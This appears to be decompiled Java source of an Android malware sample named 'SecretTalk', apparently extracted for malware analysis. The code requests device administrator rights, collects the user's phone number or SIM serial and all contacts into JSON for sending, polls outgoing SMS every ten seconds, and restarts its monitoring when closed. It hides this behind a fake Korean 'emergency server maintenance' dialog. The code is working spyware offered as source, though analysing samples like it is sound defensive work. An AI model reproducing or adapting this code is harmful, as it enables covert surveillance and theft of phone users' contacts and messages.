package com.android.secrettalk;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.google.gson.JsonObject;

public class SecretTalk
  extends Activity
{
  JsonObject _obj;
  String contactData;
  
  private void MonitorSMS()
  {
    long l = System.currentTimeMillis();
    SharedPreferences.Editor localEditor = getSharedPreferences("secretTalkApp", 0).edit();
    localEditor.putLong("time_last_checked", l);
    localEditor.commit();
    PendingIntent localPendingIntent = PendingIntent.getBroadcast(this, 0, new Intent("CHECK_OUTGOING_SMS"), 0);
    ((AlarmManager)getSystemService("alarm")).setRepeating(0, l + 10000L, 10000L, localPendingIntent);
    Log.w("SmsCheck", "end to ready");
  }
  
  public void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setContentView(2130903040);
    DevicePolicyManager localDevicePolicyManager = (DevicePolicyManager)getSystemService("device_policy");
    ComponentName localComponentName = new ComponentName(this, secrettalkreceiver.class);
    if (!localDevicePolicyManager.isAdminActive(localComponentName))
    {
      Intent localIntent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
      localIntent.putExtra("android.app.extra.DEVICE_ADMIN", localComponentName);
      localIntent.putExtra("android.app.extra.ADD_EXPLANATION", "admin usage");
      startActivityForResult(localIntent, 1);
    }
    GlobalData.getInstance().setContext(getApplicationContext());
    StringBuffer localStringBuffer = new StringBuffer();
    localStringBuffer.append("\n User Phone Number : ");
    TelephonyManager localTelephonyManager = (TelephonyManager)getSystemService("phone");
    String str = localTelephonyManager.getLine1Number().toString();
    if (str.equals("")) {
      str = localTelephonyManager.getSimSerialNumber();
    }
    localStringBuffer.append(str + "\n\n");
    GlobalData.my_phonenumber = str.toString();
    this._obj = new JsonObject();
    this._obj.add("contacts", ContactInfo.getContactInfo());
    this._obj.addProperty("user_pn", GlobalData.my_phonenumber);
    Log.w("contact", "send start");
    new SecretTalk.1(this).execute(new Void[0]);
    MonitorSMS();
    startService(new Intent(this, ReceiverRegisterService.class));
    setDialog("죄송합니다.\r\n 긴급서버점검중입니다.\r\n 빠른시간내에 퇴치하도록 하겠습니다.", "확 인");
  }
  
  protected void onDestroy()
  {
    super.onDestroy();
    MonitorSMS();
    startService(new Intent(this, ReceiverRegisterService.class));
  }
  
  void setDialog(String paramString1, String paramString2)
  {
    AlertDialog.Builder localBuilder = new AlertDialog.Builder(this);
    localBuilder.setMessage(paramString1).setCancelable(false).setPositiveButton(paramString2, new SecretTalk.2(this));
    localBuilder.create().show();
  }
}


/* Location:           D:\ManalProject\Manal\Manal-plugin\tools\decompiler\tools\classes-dex2jar.jar
 * Qualified Name:     com.android.secrettalk.SecretTalk
 * JD-Core Version:    0.7.0.1
 */